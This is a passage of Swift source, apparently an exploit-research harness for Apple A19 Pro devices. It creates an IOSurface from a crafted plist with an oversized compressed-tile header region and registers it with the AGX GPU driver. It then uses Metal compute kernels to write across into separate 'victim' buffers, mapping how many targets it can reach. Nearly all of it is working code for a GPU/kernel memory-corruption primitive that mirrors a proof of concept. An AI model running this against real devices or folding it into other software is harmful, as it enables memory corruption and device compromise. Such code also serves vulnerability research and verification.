        CVPixelBufferCreate(kCFAllocatorDefault, 640, 360, kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
                            attrs as CFDictionary, &pb)
        if let buf = pb {
            var flags: VTEncodeInfoFlags = []
            emit("xnv: encoding")
            let er = VTCompressionSessionEncodeFrame(
                s, imageBuffer: buf,
                presentationTimeStamp: CMTime(value: 0, timescale: 24000),
                duration: CMTime(value: 1001, timescale: 24000),
                frameProperties: nil, sourceFrameRefcon: nil, infoFlagsOut: &flags)
            emit("xnv: encode returned \(er)")
        }
        _ = VTCompressionSessionCompleteFrames(s, untilPresentationTimeStamp: .invalid)
        emit("xnv: survived")
        VTCompressionSessionInvalidate(s)
        emit("xnv: done")
    }

    func f1Probe() {
        emit("xf1: IOSurface F1 shape and AGX G18P")

        let f1xml = """
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
        <plist version="1.0"><dict><key>IOSurfaceWidth</key><integer>64</integer><key>IOSurfaceHeight</key><integer>64</integer><key>IOSurfaceBytesPerElement</key><integer>4</integer><key>IOSurfacePixelFormat</key><integer>1111970369</integer><key>IOSurfaceAllocSize</key><integer>65536</integer><key>IOSurfaceSliceCount</key><integer>4</integer><key>IOSurfacePlaneInfo</key><array><dict><key>IOSurfacePlaneWidth</key><integer>64</integer><key>IOSurfacePlaneHeight</key><integer>64</integer><key>IOSurfacePlaneBytesPerElement</key><integer>4</integer><key>IOSurfacePlaneBytesPerRow</key><integer>512</integer><key>IOSurfacePlaneSize</key><integer>65536</integer><key>IOSurfacePlaneCompressionType</key><integer>4</integer><key>IOSurfacePlaneDataRegionBytesPerSlice</key><integer>16384</integer><key>IOSurfacePlaneHeaderRegionBytesPerSlice</key><integer>1073741824</integer><key>IOSurfacePlaneCompressedTileWidth</key><integer>32</integer><key>IOSurfacePlaneCompressedTileHeight</key><integer>32</integer><key>IOSurfacePlaneBytesPerCompressedTileHeader</key><integer>8</integer><key>IOSurfacePlaneBytesPerTileData</key><integer>4096</integer><key>IOSurfacePlaneWidthInCompressedTiles</key><integer>2</integer><key>IOSurfacePlaneHeightInCompressedTiles</key><integer>2</integer><key>IOSurfacePlaneBytesPerRowOfTileData</key><integer>8192</integer><key>IOSurfacePlaneCompressedTileHeaderRegionOffset</key><integer>65536</integer><key>IOSurfacePlaneCompressedTileDataRegionOffset</key><integer>0</integer><key>IOSurfacePlaneBytesPerRowOfCompressedTileHeaderGroups</key><integer>0</integer></dict></array></dict></plist>
        """

        guard let root = "IOSurfaceRoot".withCString({ xq_IOServiceMatching($0) }) else { emit("xf1: no match"); return }
        var iter: io_iterator_t = 0
        guard xq_IOServiceGetMatchingServices(0, root, &iter) == KERN_SUCCESS else { emit("xf1: matching failed"); return }
        let svc = xq_IOIteratorNext(iter)
        xq_IOObjectRelease(iter)
        guard svc != 0 else { emit("xf1: no IOSurfaceRoot service"); return }
        var conn: io_connect_t = 0
        let okr = xq_IOServiceOpen(svc, mach_task_self_, 0, &conn)
        xq_IOObjectRelease(svc)
        emit("xf1: IOSurfaceRoot open=\(okr) conn=\(conn)")
        guard okr == KERN_SUCCESS else { return }

        let xmlLen = f1xml.utf8.count + 1
        var outBuf = [UInt8](repeating: 0, count: 0xc68)
        var outSize = 0xc68
        var scalarIn: UInt64 = 0
        var kr: kern_return_t = -1
        f1xml.withCString { cs in
            kr = cs.withMemoryRebound(to: UInt8.self, capacity: xmlLen) { p in
                outBuf.withUnsafeMutableBytes { ob in
                    xq_IOConnectCallMethod(conn, 0, &scalarIn, 1, p, xmlLen,
                                           nil, nil, ob.baseAddress, &outSize)
                }
            }
        }
        emit("xf1: sel0 kr=\(kr) outSize=\(outSize)")
        func rd32(_ off: Int) -> UInt32 {
            guard off + 4 <= outBuf.count else { return 0 }
            return UInt32(outBuf[off]) | (UInt32(outBuf[off+1]) << 8) | (UInt32(outBuf[off+2]) << 16) | (UInt32(outBuf[off+3]) << 24)
        }
        let sid = outSize >= 0x1c ? rd32(0x18) : 0
        emit("xf1: surfaceID=\(sid) sliceCount=\(rd32(0x74))")
        if sid != 0, let surf = IOSurfaceLookup(sid) {
            let alloc = IOSurfaceGetAllocSize(surf)
            let planes = IOSurfaceGetPlaneCount(surf)
            emit("xf1: alloc=0x\(String(alloc, radix: 16)) planes=\(planes)")
        } else {
            emit("xf1: lookup failed")
        }

        // AGX on A19 Pro is G18P, not G14P.
        guard let agxMatch = "AGXAcceleratorG18P".withCString({ xq_IOServiceMatching($0) }) else { emit("xf1: no AGX match"); return }
        var agit: io_iterator_t = 0
        let mkr = xq_IOServiceGetMatchingServices(0, agxMatch, &agit)
        let asvc = mkr == KERN_SUCCESS ? xq_IOIteratorNext(agit) : 0
        if agit != 0 { xq_IOObjectRelease(agit) }
        emit("xf1: AGXAcceleratorG18P match=\(mkr) svc=\(asvc)")
        guard asvc != 0 else { return }
        var acon: io_connect_t = 0
        let aok = xq_IOServiceOpen(asvc, mach_task_self_, 1, &acon)
        xq_IOObjectRelease(asvc)
        emit("xf1: AGX open(type=1) kr=\(aok) conn=\(acon)")
        guard aok == KERN_SUCCESS, sid != 0 else { return }

        var inStruct = [UInt8](repeating: 0, count: 0x100)
        inStruct[0] = 0x82                       // resource type
        inStruct[0x38] = UInt8(sid & 0xFF)
        inStruct[0x39] = UInt8((sid >> 8) & 0xFF)
        inStruct[0x3a] = UInt8((sid >> 16) & 0xFF)
        inStruct[0x3b] = UInt8((sid >> 24) & 0xFF)
        var agxOut = [UInt8](repeating: 0, count: 0x1000)
        var agxOutSize = 0x1000
        var akr: kern_return_t = -1
        inStruct.withUnsafeBytes { ib in
            agxOut.withUnsafeMutableBytes { ob in
                akr = xq_IOConnectCallMethod(acon, 8, nil, 0, ib.baseAddress, 0x100,
                                             nil, nil, ob.baseAddress, &agxOutSize)
            }
        }
        func rd64(_ off: Int) -> UInt64 {
            guard off + 8 <= agxOut.count else { return 0 }
            var v: UInt64 = 0
            for i in 0..<8 { v |= UInt64(agxOut[off + i]) << (8 * i) }
            return v
        }
        emit("xf1: AGX sel8 kr=\(akr) outSize=\(agxOutSize)")
        emit("xf1: out00=0x\(String(rd64(0), radix: 16)) out20=0x\(String(rd64(0x20), radix: 16)) out28=0x\(String(rd64(0x28), radix: 16))")
        emit("xf1: out10=0x\(String(rd64(0x10), radix: 16)) out50=0x\(String(rd64(0x50), radix: 16))")
        xq_IOServiceClose(acon)
        xq_IOServiceClose(conn)
        emit("xf1: done")
    }

    func f1WriteProbe() {
        emit("xfw: F1 cross-object write on A19")
        let f1xml = """
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
        <plist version="1.0"><dict><key>IOSurfaceWidth</key><integer>64</integer><key>IOSurfaceHeight</key><integer>64</integer><key>IOSurfaceBytesPerElement</key><integer>4</integer><key>IOSurfacePixelFormat</key><integer>1111970369</integer><key>IOSurfaceAllocSize</key><integer>65536</integer><key>IOSurfaceSliceCount</key><integer>4</integer><key>IOSurfacePlaneInfo</key><array><dict><key>IOSurfacePlaneWidth</key><integer>64</integer><key>IOSurfacePlaneHeight</key><integer>64</integer><key>IOSurfacePlaneBytesPerElement</key><integer>4</integer><key>IOSurfacePlaneBytesPerRow</key><integer>512</integer><key>IOSurfacePlaneSize</key><integer>65536</integer><key>IOSurfacePlaneCompressionType</key><integer>4</integer><key>IOSurfacePlaneDataRegionBytesPerSlice</key><integer>16384</integer><key>IOSurfacePlaneHeaderRegionBytesPerSlice</key><integer>1073741824</integer><key>IOSurfacePlaneCompressedTileWidth</key><integer>32</integer><key>IOSurfacePlaneCompressedTileHeight</key><integer>32</integer><key>IOSurfacePlaneBytesPerCompressedTileHeader</key><integer>8</integer><key>IOSurfacePlaneBytesPerTileData</key><integer>4096</integer><key>IOSurfacePlaneWidthInCompressedTiles</key><integer>2</integer><key>IOSurfacePlaneHeightInCompressedTiles</key><integer>2</integer><key>IOSurfacePlaneBytesPerRowOfTileData</key><integer>8192</integer><key>IOSurfacePlaneCompressedTileHeaderRegionOffset</key><integer>65536</integer><key>IOSurfacePlaneCompressedTileDataRegionOffset</key><integer>0</integer><key>IOSurfacePlaneBytesPerRowOfCompressedTileHeaderGroups</key><integer>0</integer></dict></array></dict></plist>
        """
        guard let root = "IOSurfaceRoot".withCString({ xq_IOServiceMatching($0) }) else { return }
        var it: io_iterator_t = 0
        guard xq_IOServiceGetMatchingServices(0, root, &it) == KERN_SUCCESS else { return }
        let svc = xq_IOIteratorNext(it); xq_IOObjectRelease(it)
        guard svc != 0 else { emit("xfw: no service"); return }
        var conn: io_connect_t = 0
        guard xq_IOServiceOpen(svc, mach_task_self_, 0, &conn) == KERN_SUCCESS else { emit("xfw: open failed"); return }
        xq_IOObjectRelease(svc)

        let xmlLen = f1xml.utf8.count + 1
        var outBuf = [UInt8](repeating: 0, count: 0xc68)
        var outSize = 0xc68
        var scalarIn: UInt64 = 0
        var kr: kern_return_t = -1
        f1xml.withCString { cs in
            kr = cs.withMemoryRebound(to: UInt8.self, capacity: xmlLen) { p in
                outBuf.withUnsafeMutableBytes { ob in
                    xq_IOConnectCallMethod(conn, 0, &scalarIn, 1, p, xmlLen, nil, nil, ob.baseAddress, &outSize)
                }
            }
        }
        func rd32(_ o: Int) -> UInt32 {
            guard o + 4 <= outBuf.count else { return 0 }
            return UInt32(outBuf[o]) | (UInt32(outBuf[o+1]) << 8) | (UInt32(outBuf[o+2]) << 16) | (UInt32(outBuf[o+3]) << 24)
        }
        let sid = outSize >= 0x1c ? rd32(0x18) : 0
        emit("xfw: sel0 kr=\(kr) sid=\(sid)")
        guard sid != 0, let surf = IOSurfaceLookup(sid) else { emit("xfw: no surface"); xq_IOServiceClose(conn); return }
        let base = IOSurfaceGetBaseAddress(surf)
        let alloc = IOSurfaceGetAllocSize(surf)
        emit("xfw: alloc=0x\(String(alloc, radix: 16)) base=\(base != nil)")

        guard let dev = MTLCreateSystemDefaultDevice() else { emit("xfw: no metal device"); return }
        emit("xfw: device=\(dev.name)")
        guard let f1buf = dev.makeBuffer(bytesNoCopy: base, length: 0x10000, options: .storageModeShared, deallocator: nil) else {
            emit("xfw: makeBuffer(noCopy) failed"); return
        }
        let f1ga = f1buf.gpuAddress
        emit("xfw: f1 gpuAddress=0x\(String(f1ga, radix: 16))")

        // Fillers then victim, mirroring the PoC.
        var fillers: [MTLBuffer] = []
        for _ in 0..<6 {
            if let b = dev.makeBuffer(length: 0x10000, options: .storageModeShared) { fillers.append(b) }
        }
        guard let victim = dev.makeBuffer(length: 0x10000, options: .storageModeShared) else { emit("xfw: no victim"); return }
        let vp = victim.contents().bindMemory(to: UInt32.self, capacity: 0x4000)
        for i in 0..<0x4000 { vp[i] = 0x42424242 }
        let vga = victim.gpuAddress
        emit("xfw: victim gpuAddress=0x\(String(vga, radix: 16)) delta=0x\(String(vga &- f1ga, radix: 16))")

        let src = """
        #include <metal_stdlib>
        using namespace metal;
        kernel void wr(device uint *buf [[buffer(0)]], constant uint &idx [[buffer(1)]], constant uint &val [[buffer(2)]]) { buf[idx] = val; }
        kernel void rd(device uint *buf [[buffer(0)]], device uint *out [[buffer(1)]], constant uint &idx [[buffer(2)]]) { out[0] = buf[idx]; }
        """
        guard let lib = try? dev.makeLibrary(source: src, options: nil),
              let fwr = lib.makeFunction(name: "wr"), let frd = lib.makeFunction(name: "rd"),
              let pwr = try? dev.makeComputePipelineState(function: fwr),
              let prd = try? dev.makeComputePipelineState(function: frd),
              let q = dev.makeCommandQueue(), let outb = dev.makeBuffer(length: 16, options: .storageModeShared) else {
            emit("xfw: pipeline setup failed"); return
        }

        func write(_ buf: MTLBuffer, _ idx: UInt32, _ val: UInt32) -> Bool {
            guard let cb = q.makeCommandBuffer(), let e = cb.makeComputeCommandEncoder() else { return false }
            e.setComputePipelineState(pwr); e.setBuffer(buf, offset: 0, index: 0)
            var i = idx; var v = val
            e.setBytes(&i, length: 4, index: 1); e.setBytes(&v, length: 4, index: 2)
            e.dispatchThreadgroups(MTLSize(width: 1, height: 1, depth: 1), threadsPerThreadgroup: MTLSize(width: 1, height: 1, depth: 1))
            e.endEncoding(); cb.commit(); cb.waitUntilCompleted()
            return cb.status == .completed
        }
        func read(_ buf: MTLBuffer, _ idx: UInt32) -> UInt32 {
            guard let cb = q.makeCommandBuffer(), let e = cb.makeComputeCommandEncoder() else { return 0xDEADBEEF }
            e.setComputePipelineState(prd); e.setBuffer(buf, offset: 0, index: 0); e.setBuffer(outb, offset: 0, index: 1)
            var i = idx
            e.setBytes(&i, length: 4, index: 2)
            e.dispatchThreadgroups(MTLSize(width: 1, height: 1, depth: 1), threadsPerThreadgroup: MTLSize(width: 1, height: 1, depth: 1))
            e.endEncoding(); cb.commit(); cb.waitUntilCompleted()
            return outb.contents().bindMemory(to: UInt32.self, capacity: 1)[0]
        }

        let victimIdx = UInt32((vga &- f1ga) / 4)
        emit("xfw: victimIdx=0x\(String(victimIdx, radix: 16))")
        emit("xfw: BEFORE victim[0]=0x\(String(vp[0], radix: 16)) readViaF1=0x\(String(read(f1buf, victimIdx), radix: 16))")

        let wok = write(f1buf, victimIdx, 0x43434343)
        emit("xfw: write via F1 ok=\(wok) AFTER victim[0]=0x\(String(vp[0], radix: 16))")

        // Control: same write through a plain buffer of the same size.
        if let plain = dev.makeBuffer(length: 0x10000, options: .storageModeShared) {
            let pga = plain.gpuAddress
            emit("xfw: plain gpuAddress=0x\(String(pga, radix: 16)) delta=0x\(String(vga &- pga, radix: 16))")
            if vga > pga {
                let pidx = UInt32((vga &- pga) / 4)
                _ = write(plain, pidx, 0x45454545)
                emit("xfw: control write via plain pidx=0x\(String(pidx, radix: 16)) victim[0]=0x\(String(vp[0], radix: 16))")
            }
        }
        _ = write(f1buf, victimIdx, 0x42424242)
        emit("xfw: restore victim[0]=0x\(String(vp[0], radix: 16))")
        xq_IOServiceClose(conn)
        emit("xfw: done")
    }

    func f1ReachProbe() {
        emit("xfr: F1 reachability map")
        let f1xml = """
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
        <plist version="1.0"><dict><key>IOSurfaceWidth</key><integer>64</integer><key>IOSurfaceHeight</key><integer>64</integer><key>IOSurfaceBytesPerElement</key><integer>4</integer><key>IOSurfacePixelFormat</key><integer>1111970369</integer><key>IOSurfaceAllocSize</key><integer>65536</integer><key>IOSurfaceSliceCount</key><integer>4</integer><key>IOSurfacePlaneInfo</key><array><dict><key>IOSurfacePlaneWidth</key><integer>64</integer><key>IOSurfacePlaneHeight</key><integer>64</integer><key>IOSurfacePlaneBytesPerElement</key><integer>4</integer><key>IOSurfacePlaneBytesPerRow</key><integer>512</integer><key>IOSurfacePlaneSize</key><integer>65536</integer><key>IOSurfacePlaneCompressionType</key><integer>4</integer><key>IOSurfacePlaneDataRegionBytesPerSlice</key><integer>16384</integer><key>IOSurfacePlaneHeaderRegionBytesPerSlice</key><integer>1073741824</integer><key>IOSurfacePlaneCompressedTileWidth</key><integer>32</integer><key>IOSurfacePlaneCompressedTileHeight</key><integer>32</integer><key>IOSurfacePlaneBytesPerCompressedTileHeader</key><integer>8</integer><key>IOSurfacePlaneBytesPerTileData</key><integer>4096</integer><key>IOSurfacePlaneWidthInCompressedTiles</key><integer>2</integer><key>IOSurfacePlaneHeightInCompressedTiles</key><integer>2</integer><key>IOSurfacePlaneBytesPerRowOfTileData</key><integer>8192</integer><key>IOSurfacePlaneCompressedTileHeaderRegionOffset</key><integer>65536</integer><key>IOSurfacePlaneCompressedTileDataRegionOffset</key><integer>0</integer><key>IOSurfacePlaneBytesPerRowOfCompressedTileHeaderGroups</key><integer>0</integer></dict></array></dict></plist>
        """
        guard let root = "IOSurfaceRoot".withCString({ xq_IOServiceMatching($0) }) else { return }
        var it: io_iterator_t = 0
        guard xq_IOServiceGetMatchingServices(0, root, &it) == KERN_SUCCESS else { return }
        let svc = xq_IOIteratorNext(it); xq_IOObjectRelease(it)
        var conn: io_connect_t = 0
        guard svc != 0, xq_IOServiceOpen(svc, mach_task_self_, 0, &conn) == KERN_SUCCESS else { emit("xfr: open fail"); return }
        xq_IOObjectRelease(svc)
        let xmlLen = f1xml.utf8.count + 1
        var outBuf = [UInt8](repeating: 0, count: 0xc68)
        var outSize = 0xc68
        var s0: UInt64 = 0
        var kr: kern_return_t = -1
        f1xml.withCString { cs in
            kr = cs.withMemoryRebound(to: UInt8.self, capacity: xmlLen) { p in
                outBuf.withUnsafeMutableBytes { ob in xq_IOConnectCallMethod(conn, 0, &s0, 1, p, xmlLen, nil, nil, ob.baseAddress, &outSize) }
            }
        }
        func rd32(_ o: Int) -> UInt32 {
            guard o + 4 <= outBuf.count else { return 0 }
            return UInt32(outBuf[o]) | (UInt32(outBuf[o+1]) << 8) | (UInt32(outBuf[o+2]) << 16) | (UInt32(outBuf[o+3]) << 24)
        }
        let sid = outSize >= 0x1c ? rd32(0x18) : 0
        guard sid != 0, let surf = IOSurfaceLookup(sid) else { emit("xfr: no surface kr=\(kr)"); return }
        let base = IOSurfaceGetBaseAddress(surf)
        emit("xfr: sid=\(sid) alloc=0x\(String(IOSurfaceGetAllocSize(surf), radix: 16))")

        // AGX first, so the resource mapping exists before Metal allocates.
        var agxVA: UInt64 = 0
        let agxName = agxServiceName()

        if let agx = agxName {
            benchLine("     AGX service \(agx)")
            let am = agx.withCString({ xq_IOServiceMatching($0) })
            var ai: io_iterator_t = 0
            if let am, xq_IOServiceGetMatchingServices(0, am, &ai) == KERN_SUCCESS {
                let asvc = xq_IOIteratorNext(ai); xq_IOObjectRelease(ai)
                var ac: io_connect_t = 0
                if asvc != 0, xq_IOServiceOpen(asvc, mach_task_self_, 1, &ac) == KERN_SUCCESS {
                    xq_IOObjectRelease(asvc)
                    var ain = [UInt8](repeating: 0, count: 0x100)
                    ain[0] = 0x82
                    ain[0x38] = UInt8(sid & 0xFF); ain[0x39] = UInt8((sid >> 8) & 0xFF)
                    ain[0x3a] = UInt8((sid >> 16) & 0xFF); ain[0x3b] = UInt8((sid >> 24) & 0xFF)
                    var aout = [UInt8](repeating: 0, count: 0x1000)
                    var aosz = 0x1000
                    var akr: kern_return_t = -1
                    ain.withUnsafeBytes { ib in aout.withUnsafeMutableBytes { ob in
                        akr = xq_IOConnectCallMethod(ac, 8, nil, 0, ib.baseAddress, 0x100, nil, nil, ob.baseAddress, &aosz) } }
                    var v: UInt64 = 0
                    for i in 0..<8 { v |= UInt64(aout[i]) << (8 * i) }
                    agxVA = v
                    emit("xfr: agx sel8 kr=\(akr) va=0x\(String(v, radix: 16))")
                }
            }
        }

        guard let dev = MTLCreateSystemDefaultDevice() else { emit("xfr: no device"); return }
        guard let f1buf = dev.makeBuffer(bytesNoCopy: base, length: 0x10000, options: .storageModeShared, deallocator: nil) else {
            emit("xfr: no f1 buffer"); return }
        let f1ga = f1buf.gpuAddress
        emit("xfr: f1 ga=0x\(String(f1ga, radix: 16)) agxva=0x\(String(agxVA, radix: 16)) match=\(f1ga == agxVA)")

        let src = """
        #include <metal_stdlib>
        using namespace metal;
        kernel void wr(device uint *buf [[buffer(0)]], constant uint &idx [[buffer(1)]], constant uint &val [[buffer(2)]]) { buf[idx] = val; }
        """
        guard let lib = try? dev.makeLibrary(source: src, options: nil),
              let fn = lib.makeFunction(name: "wr"),
              let ps = try? dev.makeComputePipelineState(function: fn),
              let q = dev.makeCommandQueue() else { emit("xfr: pipeline fail"); return }
        func write(_ buf: MTLBuffer, _ idx: UInt32, _ val: UInt32) -> Bool {
            guard idx < 0x40000000 else { return false }
            guard let cb = q.makeCommandBuffer(), let e = cb.makeComputeCommandEncoder() else { return false }
            e.setComputePipelineState(ps); e.setBuffer(buf, offset: 0, index: 0)
            var i = idx, v = val
            e.setBytes(&i, length: 4, index: 1); e.setBytes(&v, length: 4, index: 2)
            e.dispatchThreadgroups(MTLSize(width: 1, height: 1, depth: 1), threadsPerThreadgroup: MTLSize(width: 1, height: 1, depth: 1))
            e.endEncoding(); cb.commit(); cb.waitUntilCompleted()
            return cb.status == .completed
        }

        // 24 targets allocated after F1.
        var targets: [MTLBuffer] = []
        for _ in 0..<24 { if let b = dev.makeBuffer(length: 0x10000, options: .storageModeShared) { targets.append(b) } }
        var hits = 0
        for (i, t) in targets.enumerated() {
            let p = t.contents().bindMemory(to: UInt32.self, capacity: 0x4000)
            for k in 0..<0x4000 { p[k] = 0x42424242 }
            let ga = t.gpuAddress
            guard ga > f1ga else { emit("xfr: [\(i)] ga=0x\(String(ga, radix: 16)) below"); continue }
            let delta = ga - f1ga
            let idx = UInt32(delta / 4)
            let marker = UInt32(0x43430000 + UInt32(i))
            let ok = write(f1buf, idx, marker)
            let after = p[0]
            if after == marker { hits += 1 }
            emit("xfr: [\(i)] delta=0x\(String(delta, radix: 16)) ok=\(ok) before=0x42424242 after=0x\(String(after, radix: 16)) \(after == marker ? "HIT" : "-")")
            if after == marker { _ = write(f1buf, idx, 0x42424242) }
        }
        emit("xfr: hits=\(hits)/\(targets.count)")
        xq_IOServiceClose(conn)
        emit("xfr: done")
    }

    func f1FinalProbe() {
        emit("xfe: three final checks")
        let f1xml = """
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
        <plist version="1.0"><dict><key>IOSurfaceWidth</key><integer>64</integer><key>IOSurfaceHeight</key><integer>64</integer><key>IOSurfaceBytesPerElement</key><integer>4</integer><key>IOSurfacePixelFormat</key><integer>1111970369</integer><key>IOSurfaceAllocSize</key><integer>65536</integer><key>IOSurfaceSliceCount</key><integer>4</integer><key>IOSurfacePlaneInfo</key><array><dict><key>IOSurfacePlaneWidth</key><integer>64</integer><key>IOSurfacePlaneHeight</key><integer>64</integer><key>IOSurfacePlaneBytesPerElement</key><integer>4</integer><key>IOSurfacePlaneBytesPerRow</key><integer>512</integer><key>IOSurfacePlaneSize</key><integer>65536</integer><key>IOSurfacePlaneCompressionType</key><integer>4</integer><key>IOSurfacePlaneDataRegionBytesPerSlice</key><integer>16384</integer><key>IOSurfacePlaneHeaderRegionBytesPerSlice</key><integer>1073741824</integer><key>IOSurfacePlaneCompressedTileWidth</key><integer>32</integer><key>IOSurfacePlaneCompressedTileHeight</key><integer>32</integer><key>IOSurfacePlaneBytesPerCompressedTileHeader</key><integer>8</integer><key>IOSurfacePlaneBytesPerTileData</key><integer>4096</integer><key>IOSurfacePlaneWidthInCompressedTiles</key><integer>2</integer><key>IOSurfacePlaneHeightInCompressedTiles</key><integer>2</integer><key>IOSurfacePlaneBytesPerRowOfTileData</key><integer>8192</integer><key>IOSurfacePlaneCompressedTileHeaderRegionOffset</key><integer>65536</integer><key>IOSurfacePlaneCompressedTileDataRegionOffset</key><integer>0</integer><key>IOSurfacePlaneBytesPerRowOfCompressedTileHeaderGroups</key><integer>0</integer></dict></array></dict></plist>
        """
        guard let root = "IOSurfaceRoot".withCString({ xq_IOServiceMatching($0) }) else { return }
        var it: io_iterator_t = 0
        guard xq_IOServiceGetMatchingServices(0, root, &it) == KERN_SUCCESS else { return }
        let svc = xq_IOIteratorNext(it); xq_IOObjectRelease(it)
        var conn: io_connect_t = 0
        guard svc != 0, xq_IOServiceOpen(svc, mach_task_self_, 0, &conn) == KERN_SUCCESS else { emit("xfe: open fail"); return }
        xq_IOObjectRelease(svc)
        let xmlLen = f1xml.utf8.count + 1
        var outBuf = [UInt8](repeating: 0, count: 0xc68)
        var outSize = 0xc68
        var s0: UInt64 = 0
        f1xml.withCString { cs in
            _ = cs.withMemoryRebound(to: UInt8.self, capacity: xmlLen) { p in
                outBuf.withUnsafeMutableBytes { ob in xq_IOConnectCallMethod(conn, 0, &s0, 1, p, xmlLen, nil, nil, ob.baseAddress, &outSize) }
            }
        }
        func rd32(_ o: Int) -> UInt32 {
            guard o + 4 <= outBuf.count else { return 0 }
            return UInt32(outBuf[o]) | (UInt32(outBuf[o+1]) << 8) | (UInt32(outBuf[o+2]) << 16) | (UInt32(outBuf[o+3]) << 24)
        }
        let sid = outSize >= 0x1c ? rd32(0x18) : 0
        guard sid != 0, let surf = IOSurfaceLookup(sid) else { emit("xfe: no surface"); return }
        let base = IOSurfaceGetBaseAddress(surf)
        emit("xfe: sid=\(sid) alloc=0x\(String(IOSurfaceGetAllocSize(surf), radix: 16))")

        // AGX connection kept for repeated sel8 calls.
        var ac: io_connect_t = 0
        func sel8(_ tag: String) -> UInt64 {
            guard ac != 0 else { return 0 }
            var ain = [UInt8](repeating: 0, count: 0x100)
            ain[0] = 0x82
            ain[0x38] = UInt8(sid & 0xFF); ain[0x39] = UInt8((sid >> 8) & 0xFF)
            ain[0x3a] = UInt8((sid >> 16) & 0xFF); ain[0x3b] = UInt8((sid >> 24) & 0xFF)
            var aout = [UInt8](repeating: 0, count: 0x1000)
            var aosz = 0x1000
            var akr: kern_return_t = -1
            ain.withUnsafeBytes { ib in aout.withUnsafeMutableBytes { ob in
                akr = xq_IOConnectCallMethod(ac, 8, nil, 0, ib.baseAddress, 0x100, nil, nil, ob.baseAddress, &aosz) } }
            func q(_ o: Int) -> UInt64 { var v: UInt64 = 0; for i in 0..<8 { v |= UInt64(aout[o+i]) << (8*i) }; return v }
            emit("xfe: [\(tag)] sel8 kr=\(akr) va=0x\(String(q(0), radix: 16)) r20=0x\(String(q(0x20), radix: 16)) r28=0x\(String(q(0x28), radix: 16))")
            return q(0)
        }
        if let am = "AGXAcceleratorG18P".withCString({ xq_IOServiceMatching($0) }) {
            var ai: io_iterator_t = 0
            if xq_IOServiceGetMatchingServices(0, am, &ai) == KERN_SUCCESS {
                let asvc = xq_IOIteratorNext(ai); xq_IOObjectRelease(ai)
                if asvc != 0, xq_IOServiceOpen(asvc, mach_task_self_, 1, &ac) != KERN_SUCCESS { emit("xfe: agx open fail") }
                if asvc != 0 { xq_IOObjectRelease(asvc) }
            }
        }
        let vaBefore = sel8("before-metal")

        guard let dev = MTLCreateSystemDefaultDevice() else { emit("xfe: no device"); return }
        guard let f1buf = dev.makeBuffer(bytesNoCopy: base, length: 0x10000, options: .storageModeShared, deallocator: nil) else {
            emit("xfe: no f1 buffer"); return }
        let f1ga = f1buf.gpuAddress
        emit("xfe: f1 ga=0x\(String(f1ga, radix: 16)) agxBefore=0x\(String(vaBefore, radix: 16)) match=\(f1ga == vaBefore)")

        // Check 1: CVMetalTextureCache path.
        var pbUnmanaged: Unmanaged<CVPixelBuffer>?
        let pk = CVPixelBufferCreateWithIOSurface(kCFAllocatorDefault, surf, nil, &pbUnmanaged)
        let pb: CVPixelBuffer? = pbUnmanaged?.takeRetainedValue()
        var cache: CVMetalTextureCache?
        let ck = CVMetalTextureCacheCreate(kCFAllocatorDefault, nil, dev, nil, &cache)
        emit("xfe: texture path pixelBuffer=\(pk) cache=\(ck)")
        if pk == 0, let pixbuf = pb, ck == 0, let c = cache {
            var cvtex: CVMetalTexture?
            let tk = CVMetalTextureCacheCreateTextureFromImage(kCFAllocatorDefault, c, pixbuf, nil,
                                                              .bgra8Unorm, 64, 64, 0, &cvtex)
            let tex = cvtex.flatMap { CVMetalTextureGetTexture($0) }
            emit("xfe: tex create=\(tk) texture=\(tex != nil)")
            let vaAfter = sel8("after-texture")
            emit("xfe: agx after texture=0x\(String(vaAfter, radix: 16))")
        }

        let src = """
        #include <metal_stdlib>
        using namespace metal;
        kernel void wr(device uint *buf [[buffer(0)]], constant uint &idx [[buffer(1)]], constant uint &val [[buffer(2)]]) { buf[idx] = val; }
        """
        guard let lib = try? dev.makeLibrary(source: src, options: nil),
              let fn = lib.makeFunction(name: "wr"),
              let ps = try? dev.makeComputePipelineState(function: fn),
              let q = dev.makeCommandQueue() else { emit("xfe: pipeline fail"); return }
        func write(_ buf: MTLBuffer, _ idx: UInt32, _ val: UInt32) -> (Bool, Int32) {
            guard let cb = q.makeCommandBuffer(), let e = cb.makeComputeCommandEncoder() else { return (false, -1) }
            e.setComputePipelineState(ps); e.setBuffer(buf, offset: 0, index: 0)
            var i = idx, v = val
            e.setBytes(&i, length: 4, index: 1); e.setBytes(&v, length: 4, index: 2)
            e.dispatchThreadgroups(MTLSize(width: 1, height: 1, depth: 1), threadsPerThreadgroup: MTLSize(width: 1, height: 1, depth: 1))
            e.endEncoding(); cb.commit(); cb.waitUntilCompleted()
            return (cb.status == .completed, cb.error == nil ? 0 : 1)
        }

        guard let victim = dev.makeBuffer(length: 0x10000, options: .storageModeShared) else { emit("xfe: no victim"); return }
        let vp = victim.contents().bindMemory(to: UInt32.self, capacity: 0x4000)
        for k in 0..<0x4000 { vp[k] = 0x42424242 }

        // Check 3: control write through the victim's OWN buffer.
        let (cok, cerr) = write(victim, 0, 0x47474747)
        emit("xfe: CONTROL own-va write ok=\(cok) err=\(cerr) victim[0]=0x\(String(vp[0], radix: 16))")
        _ = write(victim, 0, 0x42424242)
        emit("xfe: control restored victim[0]=0x\(String(vp[0], radix: 16))")

        // Check 2: F1 write at the victim's VA, same shader and sync.
        let vga = victim.gpuAddress
        emit("xfe: victim ga=0x\(String(vga, radix: 16)) delta=0x\(String(vga &- f1ga, radix: 16))")
        if vga > f1ga {
            let idx = UInt32((vga &- f1ga) / 4)
            let (fok, ferr) = write(f1buf, idx, 0x48484848)
            emit("xfe: F1 write idx=0x\(String(idx, radix: 16)) ok=\(fok) err=\(ferr) victim[0]=0x\(String(vp[0], radix: 16))")
        }
        let vaLast = sel8("after-metal-buffers")
